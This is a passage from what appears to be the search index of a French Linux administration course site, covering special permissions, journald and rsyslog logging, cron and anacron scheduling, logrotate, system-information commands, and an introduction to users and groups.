appliqu\u00e9 au groupe et non \u00e0 l'utilisateur. Lorsqu'il est activ\u00e9e sur un r\u00e9pertoire, tous les fichiers cr\u00e9\u00e9s dans ce r\u00e9pertoire h\u00e9ritent du grouped ur\u00e9pertoire plut\u00f4t que du groupe primaire de l'utilisateur. Comme pour le SUID, le SGID sera symbolis\u00e9 par \"s\" \u00e0 la place du \"x\" mais sur la partie groupe (2eme triplette de permissions)(--- --s ---). Un \"S\" majuscule signifie que la permission d'ex\u00e9cution n'est pas accord\u00e9e.  </p>"},{"location":"Linux/droits_fichiers_repertoires/#sticky-bit","title":"Sticky Bit","text":"<p><code>chmod o+t &lt;r\u00e9pertoire&gt;</code> </p> <p>Si il est appliqu\u00e9 sur un fichier, celui-ci sera plac\u00e9 en zone \"SWAP\", ce qui permet de le stocker en m\u00e9moire afin d'\u00eatre relanc\u00e9 plus rapidement. Lorsqu'il est activ\u00e9 sur un r\u00e9pertoire, seuls les propri\u00e9taire des fichiers peuvent supprimer ces fichiers! et ceux m\u00eame si d'autres utilisateur ont des permissions d'\u00e9criture sur le r\u00e9pertoire. Cela est couramment utilis\u00e9 pour les r\u00e9pertoires partag\u00e9s o\u00f9 plusieurs utilisateurs ont des droits d'\u00e9criture. Cette permission est repr\u00e9sent\u00e9e par la pr\u00e9sence d'un \"t\" ou \"T\" \u00e0 l'emplacement de la permission d'ex\u00e9cution de la partie \"autre\" (3eme triplette de permissions) Ce qui ce symbolise par --- --- --t.  </p> <p>un \"t\" minuscule accord les permissions d'ex\u00e9cution. un \"T\" majuscule refuse les permissions d'ex\u00e9cution.  </p>"},{"location":"Linux/maintenance_systeme_production/","title":"Maintenance d'un syst\u00e8me en production","text":""},{"location":"Linux/maintenance_systeme_production/#analyser-le-systeme","title":"Analyser le syst\u00e8me","text":"<p>L'analyse d'un syst\u00e8me d'exploitation permet de v\u00e9rifier que tout fonctionne correctement. Nous pouvons compter sur 2 outils permettant l'analyse :</p> <ul> <li>proactifs</li> <li>r\u00e9actifs</li> </ul> <p>Afin d'analyser facilement son syst\u00e8me, il est utile de lire les journaux du syst\u00e8me (les logs). Afin de pr\u00e9server un bon fonctionnement, il est utile d'automatiser des t\u00e2ches administratives. Enfin, il est important de conna\u00eetre des commandes de prise d'informations du syst\u00e8me, la RAM, le CPU, les processus, etc.  </p>"},{"location":"Linux/maintenance_systeme_production/#gestion-des-journaux-systeme-et-applicatif","title":"Gestion des journaux syst\u00e8me et applicatif","text":"<p>Depuis Debian 9 deux services permettent la gestion des journaux applicatifs: </p> <ul> <li>Journald au travers de systemd</li> <li>L'ancien syst\u00e8me rsyslog au travers de journald</li> </ul>"},{"location":"Linux/maintenance_systeme_production/#journald","title":"journald","text":"<p>Elle permet d'interargir avec systemd afin de r\u00e9cup\u00e9rer des informations. En effet tous les services, programmes, t\u00e2ches g\u00e9r\u00e9es par systemd ont leurs comportements remont\u00e9s dans journald. La commande <code>systemctl &lt;status&gt; [daemon]</code> affiche le statut du service mais aussi les logs de l'application. Ces logs sont enregistr\u00e9s dans une base de donn\u00e9es g\u00e9r\u00e9e par journald</p>"},{"location":"Linux/maintenance_systeme_production/#commande-journalctl","title":"Commande <code>journalctl</code>","text":"<p>Puisque journald stocke les informations dans une base de donn\u00e9es, il est possible de regarder les logs complets de chaque service via la commande <code>journalctl</code>.  </p> <p>Le fichier de configuration de journald est <code>/etc/systemd/journald</code></p> <pre><code>root@deb:~$ systemctl status sshd.service\nssh.service - OpenBSD Secure Shell server\n    Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)\n    Active: active (running) since Thu 2021-06-03 14:22:07 CEST; 6 days ago\n      Docs: man:sshd(8)\n            man: sshd_config(5)\n    Process: 614 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)\n   Main PID: 621 (sshd)\n      Tasks: 1 (limit: 2315)\n     Memory: 3.8M\n     CGroup: /system.slice/ssh.service\n             -621 /usr/sbin/sshd -D\njuin 09 15:35:20 client-linux sshd[5154] : Accepted password for jdoe from\n172.19.11.13 port 61644 ssh2\njuin 09 15:35:20 client-linux sshd[5154] : pam_unix(sshd:session) : session opened\nfor user jdoe by (uid=0)\n</code></pre> <p>l'utilisation de <code>journalctl</code> est la suivante :  </p> utilisation de <code>journalctl</code> <p>=== \"<code>journalctl -f</code>     Permet la visualisation des logs en temps r\u00e9el <pre><code>root@deb:~$ journalctl -f\n-- Logs begin at Thu 2021-06-03 14:22:04 CEST. --\njuin 09 15:36:22 client-linux cracklib[5204] : no dictionary update necessary.\njuin 09 15:36:23 client linux anacron [4086]: Job cron.daily' terminated\njuin 09 15:36:45 client linux PackageKit [4305]: daemon quit\njuin 09 15:36:45 client linux systemd [1]: packagekit.service : Main process exited,\ncode=killed, status=15/TERM\n</code></pre> === \"<code>journalctl -u [nom_du_service]</code>     remonte les logs sp\u00e9cifique au service nomm\u00e9 <pre><code>root@deb:~$ journalctl u cron\n--Logs begin at Thu 2021 06 03 14:22:04 CEST, end at Wed 2021 06 09 15:41:22 CEST. --\njuin 03 14:22:06 client-linux systemd [1] : Started Regular background program\nprocessing daemon.\njuin 03 14:22:06 client-linux cron [529]: (CRON) INFO (pidfile fd = 3)\njuin 03 14:22:07 client-linux cron [529]: (CRON) INFO (Running @reboot jobs)\njuin 03 14:30:01 client-linux CRON[1337]: pam_unix cron:session ): session opened for\nuser root by (uid=0)\njuin 03 14:30:01 client-linux CRON[1338]: (root) CMD ([ x / etc init.d anacron ] &amp;&amp; if\n[ ! d /run/ systemd /system ]; then /usr/sbin/invoke-rc.d an\njuin 03 14:30:01 client-linux CRON[1337]: pam_unix(cron:session): session closed for\nuser root\n[...]\n</code></pre></p> <code>journalctl _PID [n\u00b0 du PID(processus)]</code><code>journalctl [chemin du programme/binaire]</code><code>journalctl -p &lt;level&gt;</code> <p>remonte les logs d'un processus sp\u00e9cifique <pre><code>root@deb:~$ journalctl _PID=1\n-- Logs begin at Sun 2019-04-21 07:14:36 CEST, end at Thu 2019-05-09 13:24:52 CEST. --\navril 21 08:01:38 debian systemd [1]: Started Run anacron jobs.\navril 21 08:01:38 debian systemd [1]: anacron.timer : Adding 2min 48.679199s random\ntime.\navril 21 08:53:38 debian systemd [1]: Starting Daily apt download\navril 21 08:53:45 debian systemd [1]: Started Daily apt download\navril 21 08:53:45 debian systemd [1]: apt daily.timer : Adding 10h 23.576305s random\ntime.\n</code></pre></p> <p>remonte les logs d'un programme/binaire sp\u00e9cifique <pre><code>root@deb:~$ journalctl /usr/bin/sshd\n-- Logs begin at Thu 2021-06-03 14:22:04 CEST, end at Wed 2021-06-09 16:32:19 CEST. --\njuin 03 14:22:07 client linux sshd [621]: Server listening on 0.0.0.0 port\njuin 03 14:22:07 client linux sshd [621]: Server listening on :: port\njuin 09 15:35:20 client linux sshd [5154]: Accepted password for jdoe from 172.19.11.13\nport 61644 ssh2\njuin 09 15:35:20 client linux sshd [5154]: pam_unix sshd:session ): session opened for\nuser jdoe by (uid=0)\n</code></pre></p> <p>remonte les logs selon un niveau de priorit\u00e9 d\u00e9fini dans la commande <pre><code>root@deb:~$ journalctl -p err\n-- Logs begin at Thu 2021-06-03 14:22:04 CEST, end at Wed 2021-06-09 16:32:19 CEST. --\njuin 03 14:22:07 client-linux kernel: sd 3:0:0:0: [ sdc ] No Caching mode page found\njuin 03 14:22:07 client-linux kernel: sd 3:0:0:0: [ sdc ] Assuming drive cache: write\nthrough\njuin 09 15:35:20 client-linux gdm-password][18939]: pam_unix (gdm-password:auth) :\nconversation failed\njuin 09 15:35:20 client-linux gdm-password][18939]: pam_unix (gdm-password:auth) : auth\ncould not identify password for [jdoe]\n</code></pre></p> <p>Pour la commande <code>journalctl -p</code> les niveaux de priorit\u00e9 sont les suivants:   - emerg   - alert   - crit   - err   - warning   - notice   - info   - debug</p> <p>Il est \u00e9videmment possible de cumuler les options: </p> <pre><code>root@deb\n:~$ journalctl f usr sbin sshd p info\n-- Logs begin at Thu 2021 06 03 14:22:04 CEST, end at Wed 2021 06 09 16:32:19 CEST. --\nmai 06 09:56:48 debian sshd [18901]: Accepted password for jdoe from 10.9.121.13\n    port    60042 ssh2\nmai 06 09:56:48 debian sshd [18901]: pam_unix(sshd:session) : session opened for user\n    jdoe by (uid=0)\nmai 06 15:48:06 debian sshd [18901]: pam_unix (sshd:session): session closed for user\n    jdoe\n</code></pre> <p>A noter que les logs <code>journald</code> ne sont conserv\u00e9 que pour la session en cours !</p>"},{"location":"Linux/maintenance_systeme_production/#rsyslog","title":"Rsyslog","text":"<p>Il s'agit du mode historique de Gestion des logs de Linux, tous les logs de journalctl sont transf\u00e9r\u00e9s \u00e0 rsyslog Les actions correspondent g\u00e9n\u00e9ralement \u00e0 l'\u00e9criture du journal dans un fichier, mais il est possible de configurer rsyslog pour qu'il envoie les messages \u00e0 enregistrer vers un autre serveur rsyslog. Rsyslog utilise des facilities elles peuvent \u00eatre consid\u00e9r\u00e9es comme des \"th\u00eames\" et des niveaux de priorit\u00e9s qui d\u00e9clenchent une action.  </p> facilities <ul> <li>auth: utilis\u00e9e pour des \u00e9v\u00e8nements concernant la s\u00e9curit\u00e9 ou l'authentification \u00e0 travers des applications d'acc\u00e8s (type SSH)</li> <li>authpriv: utilis\u00e9e pour les messages relatifs au contr\u00f4le d'acc\u00e8s</li> <li>daemon: utilis\u00e9e par les diff\u00e9rents processus syst\u00e8mes et d'application</li> <li>kern: utilis\u00e9e pour les messages concernant le noyau</li> <li>mail: utilis\u00e9e pour les \u00e9v\u00e8nements des services mail</li> <li>user: facility par d\u00e9faut quand aucune n'est sp\u00e9cifi\u00e9e</li> <li>local0 \u00e0 local7: utilis\u00e9es pour les messages de diff\u00e9rents programmes</li> <li>\"*\": d\u00e9signe toutes les facilities</li> <li>none: d\u00e9signe aucune facility</li> </ul> niveaux priorit\u00e9 <ul> <li>emerg: urgence, syst\u00e8me inutilisable</li> <li>alert: alerte, intervention imm\u00e9diate n\u00e9cessaire</li> <li>crit: erreur syst\u00e8me critique</li> <li>err: erreur de fonctionnement</li> <li>warning: avertissement</li> <li>notice: \u00e9v\u00e8nement normaux devant \u00eatre signal\u00e9s</li> <li>info: pour information</li> <li>debug: message de d\u00e9bogage</li> </ul> <p>voici un exemple de configuration des r\u00e8gles dans le fichier /etc/rsyslog.conf:</p> <pre><code>auth,authpriv;*         /var/log/auth.log\n*.*;auth,authpriv.none  -/var/log/syslog\n#cron.*                 /var/log/cron.log\ndaemon.*                -/var/log/daemon.log\nkern.*                  -/var/log/kern.log\n# le \"-\" devant certains chemins indique un enregistrement des logs asynchrone\n</code></pre>"},{"location":"Linux/maintenance_systeme_production/#commande-logger","title":"Commande <code>logger</code>","text":"<p><code>logger &lt;option&gt; [message]</code> </p> <p>Permets de faire des tests ou cr\u00e9er des scripts qui int\u00e9ragissent avec journald et rsyslog via la commande logger </p> <pre><code>root@deb:~$ logger -p cron.info Message de test\n</code></pre>"},{"location":"Linux/maintenance_systeme_production/#planification-des-taches","title":"Planification des t\u00e2ches","text":"<p>L'automatisation des t\u00e2ches peuvent \u00eatre effectu\u00e9 avec le service crontab. Il existe 2 types de planification :</p> <ul> <li>Planification Utilisateur</li> <li>Planification Syst\u00e8me</li> </ul>"},{"location":"Linux/maintenance_systeme_production/#crontab","title":"Crontab","text":"<p>Crontab (contraction de \"cron table\") est un utilitaire permettant de programmer l'ex\u00e9cution automatique de commandes ou de scripts sous Unix. Il permet de planifier l'ex\u00e9cution de taches r\u00e9currentes. Chaque utilisateur \u00e0 son cron dedi\u00e9.  </p> <p>crontab est un outil cl\u00e9 sous Unix pour l'automatisation et la planification de t\u00e2ches. Simple d'utilisation, il offre une grande flexibilit\u00e9 pour l'ex\u00e9cution p\u00e9riodique de commndes.  </p> <p>Les principales caract\u00e9ristiques de crontab sont:  </p> <ul> <li>Permet de d\u00e9finir des t\u00e2ches qui s'ex\u00e9cuteront automatiquement \u00e0 des dates et heures pr\u00e9cises ou selon un intervalle r\u00e9gulier.</li> <li>Les t\u00e2ches planifi\u00e9es sont d\u00e9finies dans une fichier crontab, g\u00e9n\u00e9ralement situ\u00e9 dans le r\u00e9pertoire /etc/crontab ou dans le r\u00e9pertoire personnel de l'utilisateur (~/.crontab)</li> <li>Chaque utilisateur \u00e0 son propre cron dedi\u00e9</li> <li>Le fichier crontab contient une liste de commandes avec leur planification. Chaque entr\u00e9e est compos\u00e9e de 6 champs:</li> <li>Minute (0-59)</li> <li>Heure (0-23)</li> <li>dom = day of month (1-31)</li> <li>mon = month (1-12)</li> <li>dow = day of week (0-, 0=dimanche)</li> <li>Commande \u00e0 ex\u00e9cuter</li> <li>L'utilitaire cron se charge, en arri\u00e8re-plan, de lire le fichier crontab et d'ex\u00e9cuter les commandes aux dates/heures indiqu\u00e9es</li> <li>Permet d'automatiser des t\u00e2ches d'administration syst\u00e8me (sauvegardes, purge de fichiers, scripts r\u00e9currents, etc) ou des jobs d'utilisateurs.</li> <li>Utile pour planifier des jobs sans intervention humaine. Gain de temps et fiabilit\u00e9.</li> </ul> exemple d'un fichier cron <pre><code>SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# m h dom mon dow user command\n17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron || (cd / &amp;&amp; run-parts --report /etc/cron.daily )\n47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly)\n52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly)\n</code></pre>"},{"location":"Linux/maintenance_systeme_production/#anacron","title":"Anacron","text":"<p>anacron (contraction de \"anachronistic cron\") est un utilitaire qui permet d'ex\u00e9cuter des t\u00e2ches p\u00e9riodiques sur un syst\u00e8me Linux m\u00eame si celui-ci n'est pas toujours allum\u00e9.  </p> <p>Il fonctionne en compl\u00e9ment de cron et comble certaines de ses limitations. Notamment, cron ne peut lancer une t\u00e2che si l'ordinateur est \u00e9teint au moment pr\u00e9vu. Le fichier de configuration /etc/anacrontab d\u00e9finit les t\u00e2ches \u00e0 ex\u00e9cuter et leur fr\u00e9quence (journali\u00e8re, hebdomadaire, mensuelle). Anacron ne lance pas les jobs directement mais ajoute des timestamps dans le fichier /var/spool/anacron. A chaque d\u00e9marrage, anacron v\u00e9rifie ces timestamps et d\u00e9termine si des jobs sont \"en retard\" par rapport \u00e0 leur fr\u00e9quence d\u00e9finie. Si c'est le cas, il ex\u00e9cute ces jobs via cron. Anacron r\u00e9sout donc le probl\u00e8me des jobs rat\u00e9s quand la machine est arr\u00eat\u00e9e. Il garantit leur ex\u00e9cution r\u00e9guli\u00e8re. Il est particuli\u00e8rement utile sur les ordinateurs portables ou les serveurs redemarr\u00e9s fr\u00e9quemment. Anacron ne g\u00e8re pas la minute des \"schedules\". Pour cela, crontab reste n\u00e9cessaire. Les 2 outils sont compl\u00e9mentaires.  </p> <p>En r\u00e9sum\u00e9, anacron apporte plus de robustesse aux t\u00e2ches planifi\u00e9es en palliant les arr\u00eats machine. Il travaille de paire avec cron.  </p> <p>Pour comprendre le fonctionnement d'anacron, l'explication suivante va s'appuyer sur le travail : cron.daily </p> <ul> <li>Tous les jours, si le syst\u00e8me reste allum\u00e9 24/24, cron va ex\u00e9cuter cette t\u00e2che \u00e0 6h25 :  </li> </ul> <pre><code>25  6  *  *  *   root cd / &amp;&amp; run-parts --report /etc/cron.hourly\n</code></pre> <ul> <li>Cette t\u00e2che a pour effet de lancer tous les scripts pr\u00e9sents dans le r\u00e9pertoire /etc/cron.daily.  </li> <li>En regardant dans ce r\u00e9pertoire, on voit qu'il y a un fichier 0anacron. Ce script ex\u00e9cute une simple commande qui est :  </li> </ul> <p><code>`bash anacron -u cron.daily</code>.</p>"},{"location":"Linux/maintenance_systeme_production/#gestion-de-la-taille-des-fichiers-de-log","title":"Gestion de la taille des fichiers de log","text":""},{"location":"Linux/maintenance_systeme_production/#journald_1","title":"journald","text":"<p>Journald est le gestionnaire de journaux (logs) par d\u00e9faut sur les syst\u00e8mes Linux utilisant systemd. Voici un r\u00e9sum\u00e9 de ces principales caract\u00e9ristiques:  </p> <ul> <li>Journald collecte les messages de log provenant du noyau, des d\u00e9mons syst\u00e8me, des applications etc.  </li> <li>Il stocke les journaux sous forme de fichiers journaux binaires dans /run/log/journal de fa\u00e7on temporaire et dans /var/log/journal de mani\u00e8re persistante.  </li> <li>Contrairement \u00e0 syslog, chaque message est associ\u00e9 \u00e0 un identifiant unique (monotonic timestamp).  </li> <li>Journald indexe les journaux pour permettre des recherches rapides. Il peut interroger les journaux en direct.  </li> <li>La commande <code>journalctl</code> permet de lire les journaux g\u00e9r\u00e9s par journald et d'appliquer des filtres puissants sur les entr\u00e9es.</li> <li>Journald impl\u00e9mente la rotation et la compression automatique des vieux journaux.</li> <li>Sa configuration s'effectue dans le r\u00e9pertoire /etc/systemd/journald.conf et permet notamment de param\u00e9trer la taille max, la r\u00e9tention, etc.</li> <li>Dans le fichier de configuration si le param\u00e8tre #Storage=auto est comment\u00e9 journald utilisera sa valeur par d\u00e9faut auto</li> <li>Il s'agit d'une alternative, plus riche en fonctionnalit\u00e9 que syslog avec des capacit\u00e9s de recherche et de filtration avanc\u00e9s.</li> <li>Il est cependant limit\u00e9 \u00e0 un seul syst\u00e8me, contrairement \u00e0 syslog qui permet la centralisation des logs.</li> </ul>"},{"location":"Linux/maintenance_systeme_production/#taille-des-logs-avec-journald","title":"Taille des logs avec journald","text":"<p>Journald n'a, par d\u00e9faut, pas de limite de taille fixe pour les logs. Ils peuvent cro\u00eetre ind\u00e9finimemt et occuper tout l'espace disque. Il est donc recommand\u00e9 de d\u00e9finir une limite avec l'option SystemMaxUse= dans son fichier de conf. (ex. SystemMaxUse=500M). Ainsi journald divisera alors les logs en fichiers journaux de 500Mo max. dans le r\u00e9pertoire /var/log/journal. Les anciens journaux seront automatiquement purg\u00e9s. A contrario l'option SystemMaxFileSize= permettra de limiter la taille maximum d'un seul fichier journal. SystemMaxFiles= limitera le nombre total de fichiers journaux. journald compresse les logs, le taux de compression d\u00e9pend du contenu des logs. Par d\u00e9faut, il utilisera 10% de la partition /var. L'espace requis d\u00e9pend du volume de logs g\u00e9n\u00e9r\u00e9 par le syst\u00e8me. La commande <code>journald --vacuum-size=</code> permet de vider les logs manuellement.  </p>"},{"location":"Linux/maintenance_systeme_production/#fichier-de-configuration-de-journald","title":"fichier de configuration de journald","text":"<p>Celui ce trouve dans le r\u00e9pertoire /etc/systemd/journal.conf voici une liste non exhaustive de point pouvant \u00eatre modifi\u00e9:</p> <ul> <li>SystemMaxUSe= permet de limiter la taille totale des journaux</li> <li>SystemMaxFileSize= limite la taille individuelle des fichiers journaux</li> <li>SystemMaxFiles= fixe le nombre maximum de fichiers journaux</li> <li>Storage= contr\u00f4le le mode de stockage (auto, volatile, persistent, etc.)</li> <li>Compress= choisit si les journaux sont compress\u00e9s ou non</li> <li>MaxRetentionSec= permet de d\u00e9finir la r\u00e9tention maximale avant rotation</li> <li>ForwarToSyslog= permet le transfert des journaux \u00e0 Syslog</li> </ul> <p>A noter que tous changement dans le fichier de configuration n\u00e9cessitent un red\u00e9marrage de <code>journald</code> pour qu'ils soient pris en compte.  </p>"},{"location":"Linux/maintenance_systeme_production/#precision-sur-runlogjournal","title":"Pr\u00e9cision sur /run/log/journal","text":"<p>Les logs, via journald, sont nativement stocker dans une base de donn\u00e9es volatile situ\u00e9 dans /run/log/journal. /run/log/journal contient les journaux actifs en cours d'\u00e9criture par journald. Ces fichiers ont l'extension \".journal\" Les journaux inactifs sont, quant \u00e0 eux, automatiquement archiv\u00e9s et compress\u00e9s dans le r\u00e9pertoire /var/log/journal par journald. Il s'agit d'un syst\u00e8me de fichiers tempfs mont\u00e9 en m\u00e9moire vive. Cela permet des \u00e9critures de logs rapides, MAIS ce r\u00e9pertoire est \u00e9phem\u00e8re il sera vid\u00e9 \u00e0 chaque red\u00e9marrage. /run/log/journal contient des sous-r\u00e9pertoires comme systemd/, user/, container/ avec les journaux li\u00e9s \u00e0 ces sources. La taille des journaux est limit\u00e9e par le param\u00e8tre SystemMaxUse=. La commande <code>journalctl</code> permet de lire les journaux contenu dans le r\u00e9pertoire et constitue le meilleur moyen pour cela.  </p>"},{"location":"Linux/maintenance_systeme_production/#logrotate","title":"Logrotate","text":"<p>Logrotate est un programme permettant de g\u00e9rer la rotation des fichiers journaux, Il permet de contr\u00f4ler la taille des fichiers logs et d'\u00e9viter qu'ils grossissent ind\u00e9finiment. Il est g\u00e9n\u00e9ralement ex\u00e9cut\u00e9 via une t\u00e2che cron quotidiennement. Il ira v\u00e9rifier les r\u00e8gles de rotation d\u00e9finies danss la configuration /etc/logrotate.conf et les fichiers de conf. dans /etc/logrotate.d. Ces r\u00e8gles incluent la fr\u00e9quence de rotation (quotidienne, hebdomadaire, etc.), le nb de rotation \u00e0 garder, la taille max, etc.. Ainsi quand un fichiers journal atteint le crit\u00e8re d\u00e9fini, logrotate va le renommer en lui ajoutant un suffixe avec la date, puis en cr\u00e9er un nouveau. Les anciens logs peuvent \u00eatre compress\u00e9s avec l'option <code>compress</code> permettant de gagner de l'espace de stockage. Logrotate est crucial pour \u00e9viter de remplir un disque lorsqu'un syst\u00e8me g\u00e9n\u00e8rent beaucoups de logs, sont automatiqation permet la gestion des logs sans intervention manuelle.  </p> Exemple de configuration <p><code>bash /var/log/squid/access.log { daily compress delaycompress rotate 366 create 640 }</code></p>"},{"location":"Linux/outils_analyse_systeme/","title":"Outils d'analyse du Syst\u00e8me","text":""},{"location":"Linux/outils_analyse_systeme/#prise-dinformations-sur-le-systeme","title":"Prise d'informations sur le syst\u00e8me","text":""},{"location":"Linux/outils_analyse_systeme/#version-du-systeme","title":"Version du syst\u00e8me","text":"<p>Afin de connaitre la version du syst\u00e8me utilis\u00e9 il suffit de ce servir de la commande <code>cat</code> </p> <pre><code>root@deb:~$ cat /etc/debian_version\n10.9\n</code></pre>"},{"location":"Linux/outils_analyse_systeme/#version-du-noyau","title":"Version du noyau","text":"<p>Pour la version du noyau linux actif et son architecture la commande <code>uname</code> sera utilis\u00e9e:  </p> <pre><code>root@deb:~$ uname -a\nLinux deb 5.2.0-8-amd64 #1 SMP Debian 5.2.0-8.1\n(2021-05-19)  x86_64  GNU/Linux\n</code></pre>"},{"location":"Linux/outils_analyse_systeme/#cpu","title":"CPU","text":"<p>Pour conna\u00eetre le type de CPU la commnande <code>lscpu</code> </p> <pre><code>root@deb:~$ lscpu\nArchitecture : x86_64\nMode(s) op\u00e9ratoire(s) des processeurs : 32-bit, 64-bit\nBoutisme : Little Endian\nProcesseur(s) : 1\nListe de processeur(s) en ligne : 0\nThread(s) par coeur : 1\nCoeur(s) par socket : 1\n[\u2026]\nFamille de processeur : 6\nMod\u00e8le : 42\nNom de mod\u00e8le : Intel(R) Core (TM) i5-2500 CPU @ 3.30GHz\n[\u2026]\n</code></pre>"},{"location":"Linux/outils_analyse_systeme/#lister-informations-pci","title":"Lister informations PCI","text":"<p>Commande <code>lspci</code> </p> <pre><code>root@deb lspci\n00:00.0 Host bridge: Intel Corporation 440BX/ZX - 82443 Host bridge ( rev 01)\n00:01.0 PCI bridge: Intel Corporation 440BX/ZX - 82443 AGP bridge ( rev 01)\n00:07.0 ISA bridge: Intel Corporation 82371AB/EB/MB PIIX4 ISA (rev 08)\n00:07.1 IDE interface: Intel Corporation 82371AB/EB/MB PIIX4 IDE (rev 01)\n00:07.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 08)\n00:07.7 System peripheral : VMware Virtual Machine Communication Int. (rev 10)\n00:0f.0 VGA compatible controller : VMware SVGA II Adapter\n00:10.0 SCSI storage controller : LSI Logic / Symbios Logic 53c1030 PCI-X\nFusion-MPT Dual Ultra320 SCSI (rev 01)\n00:11.0 PCI bridge: VMware PCI bridge (rev 02)\n00:15.0 PCI bridge: VMware PCI Express Root Port (rev 01)\n00:15.1 PCI bridge: VMware PCI Express Root Port (rev 01)\n</code></pre>"},{"location":"Linux/outils_analyse_systeme/#lister-les-peripheriques-usb","title":"Lister les p\u00e9riph\u00e9riques USB","text":"<p>Commande <code>lsusb</code> </p> <pre><code>root@deb lsusb\nBus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub\nBus 001 Device 003: ID 0e0f:0002 VMware, Inc. Virtual USB Hub\nBus 001 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse\nBus 001 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub\n</code></pre>"},{"location":"Linux/outils_analyse_systeme/#lister-les-informations-sur-stockage-et-systeme-de-fichiers","title":"Lister les informations sur stockage et syst\u00e8me de fichiers","text":"<p>Voir stockage </p>"},{"location":"Linux/outils_analyse_systeme/#lister-des-informations-sur-repertoires-et-fichiers","title":"Lister des informations sur r\u00e9pertoires et fichiers","text":"<p>Commande <code>du</code> voir fiche Espace de Stockage </p> <p>Commande <code>ls</code> &amp; <code>file</code> voir fiche Fichiers et Dossiers </p> <p>Commande <code>lsof</code> voir fiche bash 201 </p>"},{"location":"Linux/outils_analyse_systeme/#performances-et-processus","title":"Performances et processus","text":""},{"location":"Linux/outils_analyse_systeme/#comande-top","title":"Comande <code>top</code>","text":"<p>La commande <code>top</code> permet de voir les informations de la machine en temps r\u00e9el.  </p> <pre><code>top - 10:52:12 up 11:27, 3 users , load average : 0,00, 0,00, 0,00\nTasks: 193 total, 2 running, 191 sleeping,     0 stopped ,     0 zombie\n%Cpu (s): 1,0 us,   0,3 sy,   0,0 ni,   98,7 id,   0,0 wa,   0,0 hi,   0,0 si,   0,0 st\nMiB Mem :   1970,9 total,   406,0 free,     848,2 used,     716,7 buff/cache\nMiB Swap:   976,0 total,    976,0 free,     0,0 used.       938,3 avail Mem\n   PID USER        PR  NI      VIRT    RES     SHR S   %CPU   %MEM         TIME+ COMMAND\n     5 root        20   0         0      0       0 I    0,3    0,0       0:41.44 kworker/0:0-\nmm_percpu_wq\n   550 root        20   0    122940  12316   10708 S    0,3    0,6       0:45.42 vmtoolsd\n  2257 jdoe        20   0   2582664 295840  106080 S    0,3   14,7      11:46.09 gnome shell\n  6155 jdoe        20   0     16972   5968    4844 S    0,3    0,3       0:00.04 sshd\n  6296 jdoe        20   0     11272   3728    3008 R    0,3    0,2       0:00.04 top\n     1 root        20   0    104324  10568    7852 S    0,0    0,5       0:03.68 systemd\n     2 root        20   0         0      0       0 S    0,0    0,0       0:00.00 kthreadd\n     3 root         0  -20        0      0       0 I    0,0    0,0       0:00.00 rcu_gp\n</code></pre> <p>2 autres outils permettant de lister les performances et processus peuvent \u00eatre utilis\u00e9s mais pour cela il faudra les telecharger et les installer. Il s'agit de :</p> <ul> <li><code>htop</code></li> <li><code>glances</code></li> </ul>"},{"location":"Linux/outils_analyse_systeme/#commande-free","title":"Commande <code>free</code>","text":"<p>La commande <code>free</code> permet quant \u00e0 elle de lister les informations sur la ram.  </p> <pre><code>root@deb:~$ free -h\n        total       used    free    shared  buff/cache  available\nMem:    1,9Gi      802Mi   451Mi      23Mi       716Mi      983Mi\nSwap:   975Mi         0B   975Mi2\n</code></pre>"},{"location":"Linux/utilisateurs_groupe/","title":"Gestion des utilisateurs et groupes","text":""},{"location":"Linux/utilisateurs_groupe/#considerations-generales","title":"Consid\u00e9rations g\u00e9n\u00e9rales","text":""},{"location":"Linux/utilisateurs_groupe/#les-identifiants","title":"Les identifiants","text":"<p>Sous Linux, les utilisateurs sont repr\u00e9sent\u00e9s par deux valeurs importantes:  </p> <ul> <li>L'UID: identifiant utilisateur</li> <li>Le GID: identifiant du Groupe Principal</li> </ul> <p>Il est possible qu'un utilisateur appartienne \u00e0 plusieurs groupes. Il y aura donc les notions de groupe principal et de groupe secondaire. Le groupe principal est le groupe attribu\u00e9 \u00e0 l'utilisateur au moment de sa connexion.  </p>"},{"location":"Linux/utilisateurs_groupe/#les-types-dutilisateurs","title":"Les types d'utilisateurs","text":"<p>Les utilisateurs sont class\u00e9s en 3 cat\u00e9gories:  </p> <ul> <li>root: UID=0, GID=0   Il s'agit du super-utilisateur du syst\u00e8me. Il a tout pouvoir. Il est donc conseill\u00e9 d'\u00eatre le moins possible sous cette identit\u00e9, voire fortement conseill\u00e9 de ne pas se connecter avec mais de faire une \u00e9l\u00e9vation de privil\u00e8ges via la commande su -.   Sur certains syst\u00e8mes, il sera impossible de se connecter en root dans l'interface graphique.  </li> <li>daemon: UID= 1-999, GID= 1-999   Plage d'UID et GID r\u00e9serv\u00e9 par Linux pour ces utilisateurs.   Les utilisateurs compris entre 1 et 999 pour leur UID/GID repr\u00e9sentent les utilisateurs applicatifs (les services).   En effet sous Linux 99% des services ne sont pas ex\u00e9cut\u00e9s sous l'identit\u00e9 de root mais sous leur propre identit\u00e9 \u00e0 des fins de s\u00e9curit\u00e9.  </li> <li>Utilisateur: UID et GID &gt; 1000   Les utilisateurs \"humains\" sont repr\u00e9sent\u00e9s par des UID/GID sup\u00e9rieurs \u00e0 1000  </li> </ul>"},{"location":"Linux/utilisateurs_groupe/#les-fichiers-lies-a-la-gestion-des-groupes","title":"Les fichiers li\u00e9s \u00e0 la gestion des groupes","text":"<p>Les informations concernant les groupes d'un syst\u00e8mes Linux sont contenus dans les fichiers /etc/group et /etc/gshadow Nous pourrons y prendre des informations, mais nous ne les modifierons jamais directement La manipulation des groupes devra se faire par les commandes d\u00e9di\u00e9es  </p>"},{"location":"Linux/utilisateurs_groupe/#fichier-etcgroup","title":"Fichier /etc/group","text":"<p>Ce fichier est compos\u00e9 de plusieurs champs, s\u00e9par\u00e9s par le 